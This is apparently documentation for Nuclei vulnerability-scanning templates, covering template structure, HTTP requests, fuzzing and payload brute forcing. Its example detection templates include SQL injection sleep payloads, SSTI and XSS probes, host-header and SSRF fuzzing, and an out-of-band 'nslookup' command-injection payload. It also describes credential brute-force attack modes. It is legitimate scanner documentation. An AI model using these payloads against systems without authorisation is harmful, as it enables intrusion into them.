
---

# Templates

Introduction to Nuclei Templates
================================

YAML based universal language for describing exploitable vulnerabilities

For info on the Nuclei Template Editor or using templates on our cloud platform - [learn more here](/cloud/editor/overview).

[​](#what-are-nuclei-templates)What are Nuclei Templates?
---------------------------------------------------------

Nuclei templates are the cornerstone of the Nuclei scanning engine. Nuclei templates enable precise and rapid scanning across various protocols like TCP, DNS, HTTP, and more. They are designed to send targeted requests based on specific vulnerability checks, ensuring low-to-zero false positives and efficient scanning over large networks.

[​](#yaml)YAML
--------------

Nuclei templates are based on the concepts of `YAML` based template files that define how the requests will be sent and processed. This allows easy extensibility capabilities to nuclei. The templates are written in `YAML` which specifies a simple human-readable format to quickly define the execution process.

[​](#universal-language-for-vulnerabilities)Universal Language for Vulnerabilities
----------------------------------------------------------------------------------

Nuclei Templates offer a streamlined way to identify and communicate vulnerabilities, combining essential details like severity ratings and detection methods. This open-source, community-developed tool accelerates threat response and is widely recognized in the cybersecurity world.

Learn more about nuclei templates as a universal language for exploitable vulnerabilities [on our blog](https://projectdiscovery.io/blog/the-power-of-nuclei-templates-a-universal-language-of-vulnerabilities/).

[​](#learn-more)Learn more
--------------------------

Let’s dive into the world of Nuclei templates! Use the links on the left or those below to learn more.

Nuclei Template Structure
=========================

Learn the common elements required to create a Nuclei Template

[​](#template-structure)Template Structure
==========================================

Nuclei Templates use a custom YAML-based DSL, with their structure varying according to the specific protocol employed. Typically, a template comprises the following elements:

* A [unique ID](/_sites/docs.projectdiscovery.io/templates/structure#id) for the template
* Essential [information](/_sites/docs.projectdiscovery.io/templates/structure#information) and [metadata](/_sites/docs.projectdiscovery.io/templates/structure#metadata) relevant to the template
* The designated protocol, such as [HTTP](/templates/protocols/http/basic-http), [DNS](/templates/protocols/dns), [File](/templates/protocols/file), etc.
* Details specific to the chosen protocol, like the requests made in the HTTP protocol
* A series of [matchers](/templates/reference/matchers) to ascertain the presence of findings
* Necessary [extractors](/templates/reference/extractors) for data retrieval from the results

For a detailed, automatically generated overview of everything available in the nuclei template syntax, you can visit the [syntax reference](https://github.com/projectdiscovery/nuclei/blob/dev/SYNTAX-REFERENCE.md) on GitHub

[​](#id)ID
----------

Each template has a unique ID which is used during output writing to specify the template name for an output line.

The template file ends with **YAML** extension. The template files can be created any text editor of your choice.

```
id: git-config

```

ID must not contain spaces. This is done to allow easier output parsing.

[​](#information)Information
----------------------------

Next important piece of information about a template is the **info** block. Info block provides **name**, **author**, **severity**, **description**, **reference**, **tags** and `metadata`. It also contains **severity** field which indicates the severity of the template, **info** block also supports dynamic fields, so one can define N number of `key: value` blocks to provide more useful information about the template. **reference** is another popular tag to define external reference links for the template.

Another useful tag to always add in `info` block is **tags**. This allows you to set some custom tags to a template, depending on the purpose like `cve`, `rce` etc. This allows nuclei to identify templates with your input tags and only run them.

Example of an info block -

```
info:
  name: Git Config File Detection Template
  author: Ice3man
  severity: medium
  description: Searches for the pattern /.git/config on passed URLs.
  reference: https://www.acunetix.com/vulnerabilities/web/git-repository-found/
  tags: git,config

```

Actual requests and corresponding matchers are placed below the info block, and they perform the task of making requests to target servers and finding if the template request was successful.

Each template file can contain multiple requests to be made. The template is iterated and one by one the desired requests are made to the target sites.

The best part of this is you can simply share your crafted template with your teammates, triage/security team to replicate the issue on the other side with ease.

[​](#metadata)Metadata
----------------------

It’s possible to add metadata nodes, for example, to integrates with [uncover](https://github.com/projectdiscovery/uncover) (cf. [Uncover Integration](https://docs.projectdiscovery.io/tools/nuclei/running#scan-on-internet-database)).

The metadata nodes are crafted this way: `<engine>-query: '<query>'` where:

* `<engine>` is the search engine, equivalent of the value of the `-ue` option of nuclei or the `-e` option of uncover
* `<query>` is the search query, equivalent of the value of the `-uq` option of nuclei or the `-q` option of uncover

For example for Shodan:

```
info:
  metadata:
    shodan-query: 'vuln:CVE-2021-26855'

```

Nuclei Templates FAQ
====================

Common questions and answers about Nuclei templates, including usage tips and best practices.

For info on the Nuclei Template Editor or using templates on our cloud platform - [learn more here](/cloud/editor/overview).

What are Nuclei templates?

Nuclei [templates](http://github.com/projectdiscovery/nuclei-templates) are the core of the Nuclei project. The templates contain the actual logic that is executed in order to detect various vulnerabilities. The project consists of **several thousand** ready-to-use **[community-contributed](https://github.com/projectdiscovery/nuclei-templates/graphs/contributors)** vulnerability templates.

How can I write Nuclei templates?

We maintain a [template guide](/templates/introduction) for writing new and custom Nuclei templates.

How can writing Nuclei templates help me or my organization?

Performing security assessment of an application is time-consuming. It’s always better and time-saving to automate steps whenever possible. Once you’ve found a security vulnerability, you can prepare a Nuclei template by defining the required HTTP request to reproduce the issue, and test the same vulnerability across multiple hosts with ease. It’s worth mentioning ==you write the template once and use it forever==, as you don’t need to manually test that specific vulnerability any longer.

Here are few examples from the community making use of templates to automate the security findings:

* <https://dhiyaneshgeek.github.io/web/security/2021/02/19/exploiting-out-of-band-xxe/>
  + <https://blog.melbadry9.xyz/fuzzing/nuclei-cache-poisoning>
  + <https://blog.melbadry9.xyz/dangling-dns/xyz-services/ddns-worksites>
  + <https://blog.melbadry9.xyz/dangling-dns/aws/ddns-ec2-current-state>
  + <https://projectdiscovery.io/blog/if-youre-not-writing-custom-nuclei-templates-youre-missing-out>

How do I run Nuclei templates?

Nuclei templates can be executed using a template name or with tags, using `-templates` (`-t`) and `-tags` flag, respectively.

```
nuclei -tags cve -list target_urls.txt

```

How can I contribute a Nuclei template?

You are always welcome to share your templates with the community. You can either open a [GitHub issue](https://github.com/projectdiscovery/nuclei-templates/issues/new?assignees=&labels=nuclei-template&template=submit-template.md&title=%5Bnuclei-template%5D+template-name) with the template details or open a GitHub [pull request](https://github.com/projectdiscovery/nuclei-templates/pulls) with your nuclei templates. If you don’t have a GitHub account, you can also make use of the [discord server](https://discord.gg/projectdiscovery) to share the template with us.

I'm getting false-positive results!

The Nuclei template project is a **community-contributed project**. The ProjectDiscovery team manually reviews templates before merging them into the project. Still, there is a possibility that some templates with weak matchers will slip through the verification. This could produce false-positive results. **Templates are only as good as their matchers.**

If you identified templates producing false positive/negative results, here are few steps that you can follow to fix them quickly.

I found a template producing false positive or negative results, but I'm not sure if this is accurate.

Direct message us on [Twitter](https://twitter.com/pdnuclei) or [Discord](https://discord.gg/projectdiscovery) to confirm the validity of the template.

I found a template producing false positive or negative result and I don't know how to fix it.

Please open a GitHub [issue](https://github.com/projectdiscovery/nuclei-templates/issues/new?assignees=&labels=false-positive&template=false-positive.md&title=%5Bfalse-positive%5D+template-name+) with details, and we will work to address the problem and update the template.

I found a template producing a false positive or negative result and I know how to fix it.

Please open a GitHub [pull request](https://github.com/projectdiscovery/nuclei-templates/pulls) with fix.

Why can't I run all Nuclei templates?

The Nuclei templates project houses a variety of templates which perform fuzzing and other actions which may result in a DoS against the target system (see [the list here](https://github.com/projectdiscovery/nuclei-templates/blob/master/.nuclei-ignore)). To ensure these templates are not accidentally run, they are tagged and excluded them from the default scan. These templates can be only executed when explicitly invoked using the `-itags` option.

Templates exist on GitHub but are not running with Nuclei?

When you download or update Nuclei templates using the Nuclei binary, it
downloads all the templates from the latest **release**. All templates added
after the release exist in the [master
branch](https://github.com/projectdiscovery/nuclei-templates) and are added to
Nuclei when a new template release is created.



---

# Protocols

Basic HTTP Protocol
===================

Learn about using Basic HTTP with Nuclei

Nuclei offers extensive support for various features related to HTTP protocol. Raw and Model based HTTP requests are supported, along with options Non-RFC client requests support too. Payloads can also be specified and raw requests can be transformed based on payload values along with many more capabilities that are shown later on this Page.

HTTP Requests start with a `request` block which specifies the start of the requests for the template.

```
# Start the requests for the template right here
http:

```

[​](#method)Method
------------------

Request method can be **GET**, **POST**, **PUT**, **DELETE**, etc. depending on the needs.

```
# Method is the method for the request
method: GET

```

**Redirects**

Redirection conditions can be specified per each template. By default, redirects are not followed. However, if desired, they can be enabled with `redirects: true` in request details. 10 redirects are followed at maximum by default which should be good enough for most use cases. More fine grained control can be exercised over number of redirects followed by using `max-redirects` field.

An example of the usage:

```
http:
  - method: GET
    path:
      - "{{BaseURL}}/login.php"
    redirects: true
    max-redirects: 3

```

Currently redirects are defined per template, not per request.

[​](#path)Path
--------------

The next part of the requests is the **path** of the request path. Dynamic variables can be placed in the path to modify its behavior on runtime.

Variables start with `{{` and end with `}}` and are case-sensitive.

`{{BaseURL}}` - This will replace on runtime in the request by the input URL as specified in the target file.

`{{RootURL}}` - This will replace on runtime in the request by the root URL as specified in the target file.

`{{Hostname}}` - Hostname variable is replaced by the hostname including port of the target on runtime.

`{{Host}}` - This will replace on runtime in the request by the input host as specified in the target file.

`{{Port}}` - This will replace on runtime in the request by the input port as specified in the target file.

`{{Path}}` - This will replace on runtime in the request by the input path as specified in the target file.

`{{File}}` - This will replace on runtime in the request by the input filename as specified in the target file.

`{{Scheme}}` - This will replace on runtime in the request by protocol scheme as specified in the target file.

An example is provided below - <https://example.com:443/foo/bar.php>

| Variable | Value |
| --- | --- |
| `{{BaseURL}}` | <https://example.com:443/foo/bar.php> |
| `{{RootURL}}` | <https://example.com:443> |
| `{{Hostname}}` | example.com:443 |
| `{{Host}}` | example.com |
| `{{Port}}` | 443 |
| `{{Path}}` | /foo |
| `{{File}}` | bar.php |
| `{{Scheme}}` | https |

Some sample dynamic variable replacement examples:

```
path: "{{BaseURL}}/.git/config"
# This path will be replaced on execution with BaseURL
# If BaseURL is set to  https://abc.com then the
# path will get replaced to the following: https://abc.com/.git/config

```

Multiple paths can also be specified in one request which will be requested for the target.

[​](#headers)Headers
--------------------

Headers can also be specified to be sent along with the requests. Headers are placed in form of key/value pairs. An example header configuration looks like this:

```
# headers contain the headers for the request
headers:
  # Custom user-agent header
  User-Agent: Some-Random-User-Agent
  # Custom request origin
  Origin: https://google.com

```

[​](#body)Body
--------------

Body specifies a body to be sent along with the request. For instance:

```
# Body is a string sent along with the request
body: "{\"some random JSON\"}"

# Body is a string sent along with the request
body: "admin=test"

```

[​](#session)Session
--------------------

To maintain a cookie-based browser-like session between multiple requests, cookies are reused by default. This is beneficial when you want to maintain a session between a series of requests to complete the exploit chain or to perform authenticated scans. If you need to disable this behavior, you can use the disable-cookie field.

```
# disable-cookie accepts boolean input and false as default
disable-cookie: true

```

[​](#request-condition)Request Condition
----------------------------------------

Request condition allows checking for the condition between multiple requests for writing complex checks and exploits involving various HTTP requests to complete the exploit chain.

The functionality will be automatically enabled if DSL matchers/extractors contain numbers as a suffix with respective attributes.

For example, the attribute `status_code` will point to the effective status code of the current request/response pair in elaboration. Previous responses status codes are accessible by suffixing the attribute name with `_n`, where n is the n-th ordered request 1-based. So if the template has four requests and we are currently at number 3:

* `status_code`: will refer to the response code of request number 3
* `status_code_1` and `status_code_2` will refer to the response codes of the sequential responses number one and two

For example with `status_code_1`, `status_code_3`, and`body_2`:

```
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 404 && status_code_2 == 200 && contains((body_2), 'secret_string')"

```

Request conditions might require more memory as all attributes of previous responses are kept in memory

[​](#example-http-template)Example HTTP Template
------------------------------------------------

The final template file for the `.git/config` file mentioned above is as follows:

```
id: git-config

info:
  name: Git Config File
  author: Ice3man
  severity: medium
  description: Searches for the pattern /.git/config on passed URLs.

http:
  - method: GET
    path:
      - "{{BaseURL}}/.git/config"
    matchers:
      - type: word
        words:
          - "[core]"

```

More complete examples are provided [here](/templates/protocols/http/basic-http-examples)

Raw HTTP Protocol
=================

Learn about using Raw HTTP with Nuclei

Another way to create request is using raw requests which comes with more flexibility and support of DSL helper functions, like the following ones (as of now it’s suggested to leave the `Host` header as in the example with the variable `{{Hostname}}`), All the Matcher, Extractor capabilities can be used with RAW requests in same the way described above.

```
http:
  - raw:
    - |
        POST /path2/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        a=test&b=pd

```

Requests can be fine-tuned to perform the exact tasks as desired. Nuclei requests are fully configurable meaning you can configure and define each and every single thing about the requests that will be sent to the target servers.

RAW request format also supports [various helper functions](/templates/reference/helper-functions) letting us do run time manipulation with input. An example of the using a helper function in the header.

```
    - raw:
      - |
        GET /manager/html HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64('username:password')}} # Helper function to encode input at run time.

```

To make a request to the URL specified as input without any additional tampering, a blank Request URI can be used as specified below which will make the request to user specified input.

```
    - raw:
      - |
        GET HTTP/1.1
        Host: {{Hostname}}

```

More complete examples are provided [here](/templates/protocols/http/raw-http-examples)


HTTP Fuzzing

Fuzzing Overview
================

Learn about fuzzing HTTP requests with Nuclei

Nuclei supports fuzzing of HTTP requests based on rules defined in the `fuzzing` section of the HTTP request. This allows creating templates for generic Web Application vulnerabilities like SQLi, SSRF, CMDi, etc without any information of the target like a classic web fuzzer. We call this concept as **Fuzzing for Unknown Vulnerabilities**.

### [​](#pre-condition)pre-condition

More often than not, we want to only attempt fuzzing on those requests where it makes sense. For example,

* Fuzz Body When Body is Present
* Ignore PreFlight and CONNECT requests

and so on. With Nuclei v3.2.4 we have introduced a new `pre-condition` section which contains conditions when the fuzzing template should be executed.

pre-condition can be considered a twin of [matchers](/templates/reference/matchers) in nuclei. They support all matcher types, including DSL, and the only difference is that this serves a different purpose.

For example, to only execute template on POST request with some body, you can use the following filter.

```
- pre-condition:
    - type: dsl
      dsl:
        - method == POST
        - len(body) > 0
      condition: and

```

Currently, Only request data like header, host, input, method, path, etc is available, but soon, response data will be available once the support for loading the response along with the request is added. 

When writing/executing a template, you can use the -v -svd flags to see all variables available in filters before applying the filter.

### [​](#part)Part

Part specifies what part of the request should be fuzzed based on the specified rules. Available options for this parameter are -

**query** (`default`) - fuzz query parameters for URL

```
fuzzing:
  - part: query # fuzz parameters in URL query

```

**path** - fuzz path parameters for requests

```
fuzzing:
  - part: path # fuzz path parameters

```

**header** - fuzz header parameters for requests

```
fuzzing:
  - part: header # fuzz headers

```

**cookie** - fuzz cookie parameters for requests

```
fuzzing:
  - part: cookie # fuzz cookies

```

**body** - fuzz body parameters for requests

```
fuzzing:
  - part: body # fuzz parameters in body

```
#### [​](#special-part)Special Part

**request** - fuzz the entire request (all parts mentioned above)

```
fuzzing:
  - part: request # fuzz entire request

```
#### [​](#multiple-selective-parts)Multiple selective parts

Multiple parts can be selected for fuzzing by defining a `parts` field which is the plural of above allowing selected multiple parts to be fuzzed.

```
fuzzing:
  - parts:
      - query
      - body
      - header

```
### [​](#type)Type

Type specifies the type of replacement to perform for the fuzzing rule value. Available options for this parameter are -

1. **replace** (`default`) - replace the value with payload
2. **prefix** - prefix the value with payload
3. **postfix** - postfix the value with payload
4. **infix** - infix the value with payload (place in between)
5. **replace-regex** - replace the value with payload using regex

```
fuzzing:
  - part: query
    type: postfix # Fuzz query and postfix payload to params

```
### [​](#key-value-abstraction)Key-Value Abstraction

In a HTTP request, there are various parts like query, path, headers, cookies, and body and each part has different in various formats. For example, the query part is a key-value pair, the path part is a list of values, the body part can be a JSON, XML, or form-data.

To effectively abstract these parts and allow them to be fuzzed, Nuclei exposes these values as `key` and `value` pairs. This allows users to fuzz based on the key or value of the request part.

For example, Below sample HTTP request can be abstracted as key-value pairs as shown below.

```
POST /reset-password?token=x0x0x0&source=app HTTP/1.1
Host: 127.0.0.1:8082
User-Agent: Go-http-client/1.1
Cookie: PHPSESSID=1234567890
Content-Length: 23
Content-Type: application/json
Accept-Encoding: gzip
Connection: close

{"password":"12345678"}

```

* **`part: Query`**

| key | value |
| --- | --- |
| token | x0x0x0 |
| source | app |

* **`part: Path`**

| key | value |
| --- | --- |
| value | /reset-password |

* **`part: Header`**

| key | value |
| --- | --- |
| Host | 127.0.0.1:8082 |
| User-Agent | Go-http-client/1.1 |
| Content-Length | 23 |
| Content-Type | application/json |
| Accept-Encoding | gzip |
| Connection | close |

* **`part: Cookie`**

| key | value |
| --- | --- |
| PHPSESSID | 1234567890 |

* **`part: Body`**

| key | value |
| --- | --- |
| password | 12345678 |

**Note:** XML, JSON, Form, Multipart-FormData will be in kv format, but if the Body is binary or in any other format, the entire Body will be represented as a single key-value pair with key as `value` and value as the entire Body.

| key | value |
| --- | --- |
| value | ”\x08\x96\x01\x12\x07\x74” |

This abstraction really levels up the game since you only need to write a single rule for the Body, and it will be applied to all formats. For example, if you check for SQLi in body values, a single rule will work on all formats, i.e., JSON, XML, Form, Multipart-FormData, etc.

### [​](#mode)Mode

Mode specifies the mode in which to perform the replacements. Available modes are -

1. **multiple** (`default`) - replace all values at once
2. **single** - replace one value at a time

```
fuzzing:
  - part: query
    type: postfix
    mode: multiple # Fuzz query postfixing payloads to all parameters at once

```
> **Note**: default values are set/used when other options are not defined.

### [​](#component-data-filtering)Component Data Filtering

Multiple filters are supported to restrict the scope of fuzzing to only interesting parameter keys and values. Nuclei HTTP Fuzzing engine converts request parts into Keys and Values which then can be filtered by their related options.

The following filter fields are supported -

1. **keys** - list of parameter names to fuzz (exact match)
2. **keys-regex** - list of parameter regex to fuzz
3. **values** - list of value regex to fuzz

These filters can be used in combination to run highly targeted fuzzing based on the parameter input. A few examples of such filtering are provided below.

```
# fuzzing command injection based on parameter name value
fuzzing:
  - part: query
    type: replace
    mode: single
    keys:
      - "daemon"
      - "upload"
      - "dir"
      - "execute"
      - "download"
      - "log"
      - "ip"
      - "cli"
      - "cmd"

```

```
# fuzzing openredirects based on parameter name regex
fuzzing:
  - part: query
    type: replace
    mode: single
    keys-regex:
      - "redirect.*"

```

```
# fuzzing ssrf based on parameter value regex
fuzzing:
  - part: query
    type: replace
    mode: single
    values:
      - "https?://.*"

```
### [​](#fuzz)Fuzz

Fuzz specifies the values to replace with a `type` for a parameter. It supports payloads, DSL functions, etc and allows users to fully utilize the existing nuclei feature-set for fuzzing purposes.

```
# fuzz section for xss fuzzing with stop-at-first-match
payloads:
  reflection:
    - "6842'\"><9967"
stop-at-first-match: true
fuzzing:
  - part: query
    type: postfix
    mode: single
    fuzz:
      - "{{reflection}}"

```

```
# using interactsh-url placeholder for oob testing
payloads:
  redirect:
    - "{{interactsh-url}}"
fuzzing:
  - part: query
    type: replace
    mode: single
    keys:
      - "dest"
      - "redirect"
      - "uri"
    fuzz:
      - "https://{{redirect}}"

```

```
# using template-level variables for SSTI testing
variables:
  first: "{{rand_int(10000, 99999)}}"
  second: "{{rand_int(10000, 99999)}}"
  result: "{{to_number(first)*to_number(second)}}"

http:
    ...
    payloads:
      reflection:
        - '{{concat("{{", "§first§*§second§", "}}")}}'
    fuzzing:
      - part: query
        type: postfix
        mode: multiple
        fuzz:
          - "{{reflection}}"

```
### [​](#analyzer)Analyzer

Analyzers is a new concept introduced in nuclei fuzzing which allow the engine to make additional verification requests based on a certain logic to verify the vulnerability.

#### [​](#time-delay)time\_delay

The `time_delay` analyzer verifies that the response time of the request is controllable by the fuzzed payload. It uses a Linear Regression algorithm ported from ZAP with alternating requests to determine the server time is actually controllable rather than just noise. You can configure it like so

```
# Create a new time delay analyzer
analyzer:
  name: time_delay
  # Optionally, you can define parameters for the
  # analyzer like below.
  # 
  # the defaults are good enough for most use cases. 
  parameters:
    sleep_duration: 10 # sleep for 10 seconds (default: 5)
    requests_limit: 6 # make 6 verification requests (default: 4)
    time_correlation_error_range: 0.30 # error range for time correlation (default: 0.15)
    time_slope_error_range: 0.40 # error range for time slope (default: 0.30)

```

The following dynamic placeholders are available in payloads with `time_delay` analyzer.

* `[SLEEPTIME]` - The sleep time in seconds for the time delay analyzer.
* `[INFERENCE]` - The inference condition (%d=%d) for the time delay analyzer.

These values are substituted at runtime with the actual values for the analyzer. The following is how a usual verification process looks.

1. Send the request with the payload to the target with 5 second delay.
2. If the response time is less than 5, do nothing.
3. Send the request to the analyzer which queues it with 5 seconds delay.
4. Next a 1 second delay
5. Next a 5 second delay
6. Finally, the last 1 second delay.

If the response time is controllable, the analyzer will report the vulnerability.

Matching for the analyzer matches is pretty straightforward as well. Simiar to interactsh, you can use `part: analyzer` to match the analyzer response.

```
matchers:
  - type: word
    part: analyzer
    words:
      - "true"

```

Optionally, you can also extract the `analyzer_details` from the analyzer for matches.

### [​](#example-fuzzing-template)Example **Fuzzing** template

An example sample template for fuzzing XSS vulnerabilities is provided below.

```
id: fuzz-reflection-xss

info:
  name: Basic Reflection Potential XSS Detection
  author: pdteam
  severity: low

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'       # only run if method is GET
    payloads:
      reflection:
        - "6842'\"><9967"

    stop-at-first-match: true
    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{reflection}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{reflection}}"

      - type: word
        part: header
        words:
          - "text/html"

```

More complete examples are provided [here](/templates/protocols/http/fuzzing-examples)


HTTP Fuzzing

Fuzzing Examples
================

Review some examples of fuzzing with Nuclei

[​](#basic-ssti-template)Basic SSTI Template
--------------------------------------------

A simple template to discover `{{<number>*<number>}}` type SSTI vulnerabilities.

```
id: fuzz-reflection-ssti

info:
  name: Basic Reflection Potential SSTI Detection
  author: pdteam
  severity: low

variables:
  first: "{{rand_int(10000, 99999)}}"
  second: "{{rand_int(10000, 99999)}}"
  result: "{{to_number(first)*to_number(second)}}"

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'       # only run on GET URLs

    payloads:
      reflection:
        - '{{concat("{{", "§first§*§second§", "}}")}}'

    fuzzing:
      - part: query
        type: postfix
        mode: multiple
        fuzz:
          - "{{reflection}}"

    matchers:
      - type: word
        part: body
        words:
          - "{{result}}"

```

[​](#blind-time-based-sqli-template)Blind Time Based SQLi Template
------------------------------------------------------------------

A template to detect blind time based SQLi with a time delay analyzer.

```
id: mysql-blind-time-based-sqli

info:
  name: MySQL SQLi - Blind Time based
  author: pdteam
  severity: critical
  reference:
    - https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/SqlInjectionMySqlScanRule.java

http:
  - payloads:
      injections:
        low:
          - " / sleep([SLEEPTIME]) "
          - "' / sleep([SLEEPTIME]) / '"
          - "\" / sleep([SLEEPTIME]) / \""
        medium:
          - " and 0 in (select sleep([SLEEPTIME]) ) -- "
          - "' and 0 in (select sleep([SLEEPTIME]) ) -- "
          - "\" and 0 in (select sleep([SLEEPTIME]) ) -- "
          - " where 0 in (select sleep([SLEEPTIME]) ) -- "
          - "' where 0 in (select sleep([SLEEPTIME]) ) -- "
          - "\" where 0 in (select sleep([SLEEPTIME]) ) -- "
        high:
          - "\" where 0 in (select sleep([SLEEPTIME]) ) and \"\"=\""
          - " and 0 in (select sleep([SLEEPTIME]) ) "
          - "' and 0 in (select sleep([SLEEPTIME]) ) and ''='"
          - "\" and 0 in (select sleep([SLEEPTIME]) ) and \"\"=\""
          
    attack: pitchfork
    analyzer:
      name: time_delay
        
    fuzzing:
      - part: request # fuzz all the request parts.
        type: postfix
        mode: single
        fuzz:
          - "{{injections}}"
          
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: analyzer
        words:
          - "true"

```

[​](#basic-xss-template)Basic XSS Template
------------------------------------------

A simple template to discover XSS probe reflection in HTML pages.

```
id: fuzz-reflection-xss

info:
  name: Basic Reflection Potential XSS Detection
  author: pdteam
  severity: low

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'       # only run on GET URLs

    payloads:
      reflection:
        - "6842'\"><9967"

    stop-at-first-match: true
    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{reflection}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{reflection}}"

      - type: word
        part: header
        words:
          - "text/html"

```

[​](#basic-openredirect-template)Basic OpenRedirect Template
------------------------------------------------------------

A simple template to discover open-redirects issues.

```
id: fuzz-open-redirect

info:
  name: Basic Open Redirect Detection
  author: pdteam
  severity: low

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'       # only run on GET URLs

    payloads:
      redirect:
        - "https://example.com"

    fuzzing:
      - part: query
        type: replace
        mode: single
        keys-regex:
          - "redirect.*"
        fuzz:
          - "{{redirect}}"

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "{{redirect}}"

      - type: status
        status:
          - 301
          - 302
          - 307

```

[​](#basic-path-based-sqli)Basic Path Based SQLi
------------------------------------------------

A example template to discover path-based SQLi issues.

```
http:
    # pre-condition to determine if the template should be executed
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "POST"'       # only run if method is POST
          - 'contains(path,"reset")' # only run if path contains reset word
        condition: and

    # fuzzing rules
    fuzzing:
      - part: header # This rule will be applied to the header
        type: replace # replace the type of rule (i.e., existing values will be replaced with payload)
        mode: multiple # multiple mode (i.e., all existing values will be replaced/used at once)
        fuzz:
          X-Forwarded-For: "{{domain}}"  # here {{domain}} is attacker-controlled server
          X-Forwarded-Host: "{{domain}}"
          Forwarded: "{{domain}}"
          X-Real-IP: "{{domain}}"
          X-Original-URL: "{{domain}}"
          X-Rewrite-URL: "{{domain}}"
          Host: "{{domain}}"

```

[​](#basic-host-header-injection)Basic Host Header Injection
------------------------------------------------------------

A simple template to discover host header injection issues.

```
http:
    # pre-condition to determine if the template should be executed
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "POST"'       # only run if method is POST
          - 'contains(path,"reset")' # only run if path contains reset word
        condition: and

    # fuzzing rules
    fuzzing:
      - part: header # This rule will be applied to the header
        type: replace # replace the type of rule (i.e., existing values will be replaced with payload)
        mode: multiple # multiple mode (i.e., all existing values will be replaced/used at once)
        fuzz:
          X-Forwarded-For: "{{domain}}"  # here {{domain}} is attacker-controlled server
          X-Forwarded-Host: "{{domain}}"
          Forwarded: "{{domain}}"
          X-Real-IP: "{{domain}}"
          X-Original-URL: "{{domain}}"
          X-Rewrite-URL: "{{domain}}"
          Host: "{{domain}}"

```

[​](#blind-ssrf-oob-detection)Blind SSRF OOB Detection
------------------------------------------------------

A simple template to detect Blind SSRF in known-parameters using interactsh with HTTP fuzzing.

```
id: fuzz-ssrf

info:
  name: Basic Blind SSRF Detection
  author: pdteam
  severity: low

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'       # only run on GET URLs

    payloads:
      redirect:
        - "{{interactsh-url}}"

    fuzzing:
      - part: query
        type: replace
        mode: single
        keys:
          - "dest"
          - "redirect"
          - "uri"
          - "path"
          - "continue"
          - "url"
          - "window"
          - "next"
          - "data"
          - "reference"
          - "site"
          - "html"
          - "val"
          - "validate"
          - "domain"
          - "callback"
          - "return"
          - "page"
          - "feed"
          - "host"
          - "port"
          - "to"
          - "out"
          - "view"
          - "dir"
          - "show"
          - "navigation"
          - "open"
        fuzz:
          - "https://{{redirect}}"

    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the DNS Interaction
        words:
          - "http"

```

[​](#blind-cmdi-oob-based-detection)Blind CMDi OOB based detection
------------------------------------------------------------------

A simple template to detect blind CMDI using interactsh

```
id: fuzz-cmdi

info:
  name: Basic Blind CMDI Detection
  author: pdteam
  severity: low

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    payloads:
      redirect:
        - "{{interactsh-url}}"
    fuzzing:
        fuzz:
          - "nslookup {{redirect}}"
    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the DNS Interaction
        words:
          - "dns"

```


HTTP Payloads

HTTP Payloads
=============

Learn about bruteforcing HTTP requests using payloads with Nuclei

[​](#overview)Overview
----------------------

Nuclei engine supports brute forcing any value/component of HTTP Requests using payloads module, that allows to run various type of payloads in multiple format, It’s possible to define placeholders with simple keywords (or using brackets `{{helper_function(variable)}}` in case mutator functions are needed), and perform **batteringram**, **pitchfork** and **clusterbomb** attacks.

The **wordlist** for these attacks needs to be defined during the request definition under the Payload field, with a name matching the keyword, Nuclei supports both file based and in template wordlist support and Finally all DSL functionalities are fully available and supported, and can be used to manipulate the final values.

Payloads are defined using variable name and can be referenced in the request in between `{{ }}` marker.

### [​](#difference-between-http-payloads-and-http-fuzzing)Difference between **HTTP Payloads** and **HTTP Fuzzing**

While both may sound similar, the major difference between **Fuzzing** and **Payloads/BruteForce** is that Fuzzing is a superset of Payloads/BruteForce and has extra features related to finding Unknown Vulnerabilities while Payloads is just plain brute forcing of values with a given attack type and set of payloads.

[​](#examples)Examples
----------------------

An example of the using payloads with local wordlist:

```
# HTTP Intruder fuzzing using local wordlist.

payloads:
  paths: params.txt
  header: local.txt

```

An example of the using payloads with in template wordlist support:

```
# HTTP Intruder fuzzing using in template wordlist.

payloads:
  password:
    - admin
    - guest
    - password

```

**Note:** be careful while selecting attack type, as unexpected input will break the template.

For example, if you used `clusterbomb` or `pitchfork` as attack type and defined only one variable in the payload section, template will fail to compile, as `clusterbomb` or `pitchfork` expect more than one variable to use in the template.

[​](#attack-mode)Attack mode
----------------------------

Nuclei engine supports multiple attack types, including `batteringram` as default type which generally used to fuzz single parameter, `clusterbomb` and `pitchfork` for fuzzing multiple parameters which works same as classical burp intruder.

| **Type** | batteringram | pitchfork | clusterbomb |
| --- | --- | --- | --- |
| **Support** | ✔ | ✔ | ✔ |

### [​](#batteringram)batteringram

The battering ram attack type places the same payload value in all positions. It uses only one payload set. It loops through the payload set and replaces all positions with the payload value.

### [​](#pitchfork)pitchfork

The pitchfork attack type uses one payload set for each position. It places the first payload in the first position, the second payload in the second position, and so on.

It then loops through all payload sets at the same time. The first request uses the first payload from each payload set, the second request uses the second payload from each payload set, and so on.

### [​](#clusterbomb)clusterbomb

The cluster bomb attack tries all different combinations of payloads. It still puts the first payload in the first position, and the second payload in the second position. But when it loops through the payload sets, it tries all combinations.

It then loops through all payload sets at the same time. The first request uses the first payload from each payload set, the second request uses the second payload from each payload set, and so on.

This attack type is useful for a brute-force attack. Load a list of commonly used usernames in the first payload set, and a list of commonly used passwords in the second payload set. The cluster bomb attack will then try all combinations.

